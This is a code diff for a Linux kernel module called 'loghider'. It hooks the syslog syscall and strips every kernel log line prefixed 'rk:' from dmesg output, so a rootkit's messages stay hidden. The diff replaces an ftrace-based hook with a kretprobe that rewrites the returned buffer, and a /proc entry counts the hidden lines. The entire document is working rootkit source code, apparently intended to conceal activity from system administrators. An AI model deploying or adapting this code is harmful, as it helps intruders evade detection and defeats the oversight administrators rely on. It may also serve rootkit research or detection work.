@@ -1,59 +1,54 @@
 // SPDX-License-Identifier: GPL-2.0
-#include <linux/fs.h>
-#include <linux/ftrace.h>
 #include <linux/init.h>
 #include <linux/kprobes.h>
 #include <linux/module.h>
-#include <linux/printk.h>
 #include <linux/proc_fs.h>
 #include <linux/seq_file.h>
 #include <linux/slab.h>
 #include <linux/uaccess.h>
 
 #define HIDE_PREFIX "rk:"
-#define ENDBR_SIZE 4
 
 static struct proc_dir_entry *proc_entry;
 static atomic_t hidden_count = ATOMIC_INIT(0);
-static unsigned long sys_syslog_addr;
 
-static unsigned long lookup_name(const char *name)
+struct syslog_ctx {
+	int type;
+	char __user *ubuf;
+};
+
+static int entry_syslog(struct kretprobe_instance *ri, struct pt_regs *regs)
 {
-	struct kprobe kp = { .symbol_name = name };
-	unsigned long addr;
+	struct syslog_ctx *ctx = (void *)ri->data;
+	struct pt_regs *uregs = (struct pt_regs *)regs->di;
 
-	if (register_kprobe(&kp))
-		return 0;
-	addr = (unsigned long)kp.addr;
-	unregister_kprobe(&kp);
-	return addr;
+	ctx->type = (int)uregs->di;
+	ctx->ubuf = (char __user *)uregs->si;
+	return 0;
 }
 
-typedef long (*syslog_t)(const struct pt_regs *);
-static syslog_t orig_syslog;
-static struct ftrace_ops syslog_ops;
-
-static void scrub_lines(char __user *ubuf, int *ret)
+static int ret_syslog(struct kretprobe_instance *ri, struct pt_regs *regs)
 {
+	struct syslog_ctx *ctx = (void *)ri->data;
+	int ret = (int)regs_return_value(regs);
 	char *kbuf, *src, *dst, *end, *nl;
-	int orig_len = *ret;
 
-	if (orig_len <= 0)
-		return;
+	if (ret <= 0 || (ctx->type != 2 && ctx->type != 3))
+		return 0;
 
-	kbuf = kmalloc(orig_len + 1, GFP_KERNEL);
+	kbuf = kmalloc(ret + 1, GFP_KERNEL);
 	if (!kbuf)
-		return;
+		return 0;
 
-	if (copy_from_user(kbuf, ubuf, orig_len)) {
+	if (copy_from_user(kbuf, ctx->ubuf, ret)) {
 		kfree(kbuf);
-		return;
+		return 0;
 	}
-	kbuf[orig_len] = '\0';
+	kbuf[ret] = '\0';
 
 	src = kbuf;
 	dst = kbuf;
-	end = kbuf + orig_len;
+	end = kbuf + ret;
 
 	while (src < end) {
 		nl = memchr(src, '\n', end - src);
@@ -72,73 +67,20 @@ static void scrub_lines(char __user *ubuf, int *ret)
 		src = nl + 1;
 	}
 
-	*ret = dst - kbuf;
-	if (copy_to_user(ubuf, kbuf, *ret))
-		;
+	ret = dst - kbuf;
+	copy_to_user(ctx->ubuf, kbuf, ret);
+	regs_set_return_value(regs, ret);
 	kfree(kbuf);
-}
-
-static long noinline intercepted_syslog(const struct pt_regs *regs)
-{
-	int type = (int)regs->di;
-	long ret;
-
-	ret = orig_syslog(regs);
-
-	if (ret > 0 && (type == 3 || type == 2)) {
-		int r = (int)ret;
-
-		scrub_lines((char __user *)regs->si, &r);
-		ret = r;
-	}
-
-	return ret;
-}
-
-static void notrace redirect_syslog(unsigned long ip, unsigned long parent_ip,
-				    struct ftrace_ops *ops,
-				    struct ftrace_regs *fregs)
-{
-	struct pt_regs *regs = ftrace_get_regs(fregs);
-
-	if (!regs || within_module(parent_ip, THIS_MODULE))
-		return;
-
-	regs->ip = (unsigned long)intercepted_syslog;
-}
-
-static int install_hook(void)
-{
-	int err;
-
-	sys_syslog_addr = lookup_name("__x64_sys_syslog");
-	if (!sys_syslog_addr)
-		return -ENOENT;
-
-	orig_syslog = (syslog_t)(sys_syslog_addr - ENDBR_SIZE);
-
-	syslog_ops.func = redirect_syslog;
-	syslog_ops.flags = FTRACE_OPS_FL_SAVE_REGS |
-			   FTRACE_OPS_FL_IPMODIFY |
-			   FTRACE_OPS_FL_RECURSION;
-
-	err = ftrace_set_filter_ip(&syslog_ops, sys_syslog_addr, 0, 0);
-	if (err)
-		return err;
-
-	err = register_ftrace_function(&syslog_ops);
-	if (err) {
-		ftrace_set_filter_ip(&syslog_ops, sys_syslog_addr, 1, 0);
-		return err;
-	}
 	return 0;
 }
 
-static void remove_hook(void)
-{
-	unregister_ftrace_function(&syslog_ops);
-	ftrace_set_filter_ip(&syslog_ops, sys_syslog_addr, 1, 0);
-}
+static struct kretprobe krp = {
+	.kp.symbol_name	= "__x64_sys_syslog",
+	.entry_handler	= entry_syslog,
+	.handler	= ret_syslog,
+	.data_size	= sizeof(struct syslog_ctx),
+	.maxactive	= 20,
+};
 
 static int stats_show(struct seq_file *m, void *v)
 {
@@ -150,18 +92,17 @@ static int __init loghider_init(void)
 {
 	int err;
 
-	err = install_hook();
-	if (err) {
-		pr_err("rk: __x64_sys_syslog not found\n");
+	err = register_kretprobe(&krp);
+	if (err)
 		return err;
-	}
 
 	pr_info("rk: log hiding active\n");
 	pr_info("rk: this line should be hidden from dmesg\n");
 
-	proc_entry = proc_create_single("rk_logfilter", 0444, NULL, stats_show);
+	proc_entry = proc_create_single("rk_logfilter", 0444, NULL,
+					stats_show);
 	if (!proc_entry) {
-		remove_hook();
+		unregister_kretprobe(&krp);
 		return -ENOMEM;
 	}
 
@@ -171,7 +112,7 @@ static int __init loghider_init(void)
 static void __exit loghider_exit(void)
 {
 	proc_remove(proc_entry);
-	remove_hook();
+	unregister_kretprobe(&krp);
 }
 
 module_init(loghider_init);
